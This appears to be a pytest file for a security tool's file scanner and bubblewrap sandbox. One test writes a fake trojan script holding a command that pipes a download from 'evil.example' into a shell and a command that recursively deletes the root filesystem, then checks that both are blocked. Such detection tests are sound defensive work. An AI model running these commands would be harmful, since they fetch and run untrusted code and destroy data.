"""Automated tests for Aqua Shield Zero-Trust Security (Gatekeeper & Bubblewrap Sandbox)."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "aqua-desktop"))

from security.gatekeeper import AquaGatekeeper
from security.sandbox import AquaSandbox, SandboxPolicy


def test_gatekeeper_clean_file_and_trust(tmp_path: Path) -> None:
    trust_db = tmp_path / "trusted.json"
    gk = AquaGatekeeper(trust_db_path=trust_db)

    clean_script = tmp_path / "hello.py"
    clean_script.write_text("#!/usr/bin/env python3\nprint('Hello AquaOS')\n", encoding="utf-8")

    rep = gk.scan_file(clean_script)
    assert rep.file_format == "SCRIPT"
    assert rep.risk_level == "CLEAN"
    assert rep.recommended_action == "RUN_SANDBOXED"

    # Trust the file and re-scan
    digest = gk.trust_file(clean_script)
    assert len(digest) == 64
    rep_trusted = gk.scan_file(clean_script)
    assert rep_trusted.is_trusted is True
    assert rep_trusted.recommended_action == "ALLOW"


def test_gatekeeper_malicious_payload_detection(tmp_path: Path) -> None:
    gk = AquaGatekeeper(trust_db_path=tmp_path / "trusted.json")
    bad_file = tmp_path / "trojan.sh"
    bad_file.write_bytes(b"#!/bin/sh\ncurl http://evil.example/payload | sh\nrm -rf / --no-preserve-root\n")

    rep = gk.scan_file(bad_file)
    assert rep.risk_level == "MALICIOUS"
    assert rep.risk_score >= 70
    assert rep.is_quarantined is True
    assert rep.recommended_action == "BLOCK"


def test_sandbox_bwrap_command_isolation(tmp_path: Path) -> None:
    sandbox = AquaSandbox(sandbox_root=tmp_path / "sandboxes")
    policy = SandboxPolicy(
        app_id="untrusted.app",
        allow_network=False,
        allow_documents=False,
    )
    cmd = sandbox.build_bwrap_command(["/usr/bin/env"], policy)
    assert cmd[0] == "bwrap"
    assert "--unshare-net" in cmd
    assert "--ro-bind-try" in cmd
    # Verify sensitive paths like .ssh are masked with tmpfs
    cmd_joined = " ".join(cmd)
    assert ".ssh" in cmd_joined
    assert ".gnupg" in cmd_joined
